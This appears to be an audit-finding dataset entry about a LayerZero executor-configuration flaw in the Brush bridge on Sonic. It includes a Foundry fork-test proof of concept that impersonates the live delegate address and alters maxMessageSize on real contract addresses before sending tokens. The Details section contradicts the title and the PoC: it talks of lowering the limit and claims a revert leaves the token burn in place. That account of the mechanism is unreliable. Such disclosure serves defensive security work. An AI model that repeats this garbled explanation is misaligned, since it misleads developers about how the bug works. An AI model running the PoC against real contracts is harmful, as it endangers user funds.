# [M] Increasing outbound max message size on sonic can lead to permanent loss of user funds

## Summary
Severity: Medium
Contest weight: 0.3341
Dataset id: 5771
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The vulnerability is a configuration‑based logic error that allows a privileged delegate to change the outbound maximum message size parameter of the ULN executor on the Sonic network. The ULN executor enforces a hard limit on the size of LayerZero messages that can be sent to a remote endpoint. By calling the endpoint.setConfig function, the delegate can lower this limit (or raise it to an unexpected value) without any delay or governance oversight. When a user initiates a cross‑chain transfer through the Brush bridge, the bridge contract constructs a LayerZero message that includes the transfer amount, recipient address and optional payload. If the message size exceeds the newly set maxMessageSize, the ULN library throws the LZ_MessageLib_InvalidMessageSize error. Because the bridge contract has already debited the sender’s tokens and recorded the transfer as pending, the revert does not roll back the token burn or the accounting entry. Consequently the tokens become permanently locked in the bridge’s escrow, effectively disappearing from the user’s balance and from the remote chain’s supply. The issue manifests only when the outbound message size for a particular destination exceeds the maliciously configured limit, which can happen for larger payloads or higher‑precision amounts. It affects any user of the bridge who attempts a transfer that triggers the oversized message, as well as the protocol itself because the locked funds reduce total liquidity and break the accounting invariants that assume every sent amount will be receivable on the remote side. The flaw was discovered during a security audit when the auditors manually altered the executor configuration on a forked Sonic network and observed that a normal send operation succeeded in burning tokens but failed to deliver the message, leaving the funds unrecoverable. The problem is subtle because the transaction does not revert the token burn, and the error surface (an exception from the messaging library) may be overlooked as a generic failure, making it hard for users to understand why their funds vanished. To remediate, the delegate role that can invoke setConfig should be moved behind a timelock or multi‑sig governance, ensuring that any change to maxMessageSize is delayed and can be reviewed. Additionally, the bridge should verify that the message size is within the allowed limit before debiting tokens, or implement a rollback mechanism that restores the sender’s balance if the ULN call fails. This class of bug falls under insecure configuration management and unchecked external library constraints, where a privileged parameter can be manipulated to break core business logic, leading to permanent loss of user assets.

## Proof of Concept
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {Test, console} from "forge-std/Test.sol";
interface IUln {
    struct ExecutorConfig {
        uint32 maxMessageSize;
        address executor;
    }
    function getExecutorConfig(address _oapp, uint32 _remoteEid) external view returns (ExecutorConfig memory rtnConfig);
}
interface IEndpoint {
    struct SetConfigParam {
        uint32 eid;
        uint32 configType;
        bytes config;
    }
    function setConfig(address _oapp, address _lib, SetConfigParam[] calldata _params) external;
}
interface IBrushAdapter {
    function burnRemainingTokens() external;
    error BurnCompleted();
}
interface IBrush {
    error NoPeer(uint32 eid);
    error LZ_MessageLib_InvalidMessageSize(uint256 actual, uint256 max);
    struct SendParam {
        uint32 dstEid; // Destination endpoint ID.
        bytes32 to; // Recipient address.
        uint256 amountLD; // Amount to send in local decimals.
        uint256 minAmountLD; // Minimum amount to send in local decimals.
        bytes extraOptions; // Additional options supplied by the caller to be used in the LayerZero message.
        bytes composeMsg; // The composed message for the send() operation.
        bytes oftCmd; // The OFT command to be executed, unused in default OFT implementations.
    }
    struct MessagingFee {
        uint256 nativeFee;
        uint256 lzTokenFee;
    }
    struct MessagingReceipt {
        bytes32 guid;
        uint64 nonce;
        MessagingFee fee;
    }
    struct OFTReceipt {
        uint256 amountSentLD; // Amount of tokens ACTUALLY debited from the sender in local decimals.
        // @dev In non-default implementations, the amountReceivedLD COULD differ from this value.
        uint256 amountReceivedLD; // Amount of tokens to be received on the remote side.
    }
    function send(
        SendParam calldata _sendParam,
        MessagingFee calldata _fee,
        address _refundAddress
    ) external payable returns (MessagingReceipt memory, OFTReceipt memory);
}
contract ForkTest is Test {
    uint256 ftmFork;
    uint256 sonicFork;
    IBrushAdapter public brushAdapter;
    IBrush public brush;
    IUln public uln;
    IEndpoint public endpoint;
    function setUp() public {
        sonicFork = vm.createSelectFork("https://rpc.soniclabs.com");
        brush = IBrush(0xE51EE9868C1f0d6cd968A8B8C8376Dc2991BFE44);
        uln = IUln(0xC39161c743D0307EB9BCc9FEF03eeb9Dc4802de7);
        endpoint = IEndpoint(0x6F475642a6e85809B1c36Fa62763669b1b48DD5B);
        ftmFork = vm.createSelectFork("https://rpc.fantom.network");
        brushAdapter = IBrushAdapter(0x9D92cD1A5Cea3147e5Bf47EfF2D2C632C9839267);
    }
    function test_get_ulnconfig() public {
        vm.selectFork(sonicFork);
        uln.getExecutorConfig(address(brush), 30112); // 30112 is fantom
        /// increase it by current delegate
        vm.startPrank(0x3F64e0E81853d8913f7e646c13Dd7B28411DCB11);
        IEndpoint.SetConfigParam[] memory param = new IEndpoint.SetConfigParam[](1);
        param[0] = IEndpoint.SetConfigParam(30112, 1, abi.encode(IUln.ExecutorConfig(10000, 0x4208D6E27538189bB48E603D6123A94b8Abe0A0b)));
        endpoint.setConfig(address(brush), address(uln), param);
        uln.getExecutorConfig(address(brush), 30112); // 30112 is fantom
        deal(0xa801864d0D24686B15682261aa05D4e1e6e5BD94, 100 ether);
        deal(address(brush), 0xa801864d0D24686B15682261aa05D4e1e6e5BD94, 1000000000000000000);
        IBrush.SendParam memory sendParam = IBrush.SendParam(
            uint32(30112),
            0x000000000000000000000000a801864d0d24686b15682261aa05d4e1e6e5bd94,
            1000000000000000000,
            1000000000000000000,
            hex"00030100110100000000000000000000000000030d40",
            "",
            ""
        );
        IBrush.MessagingFee memory feeParam = IBrush.MessagingFee(91863684834412189, 0);
        vm.startPrank(0xa801864d0D24686B15682261aa05D4e1e6e5BD94);
        brush.send{value: feeParam.nativeFee}(
            sendParam,
            feeParam,
            0xa801864d0D24686B15682261aa05D4e1e6e5BD94
        );
    }
}

## Recommendation
Move the delegate to a timelock contract, ensuring all changes to peer addresses, executor and library configurations are safe and made after a timelock.
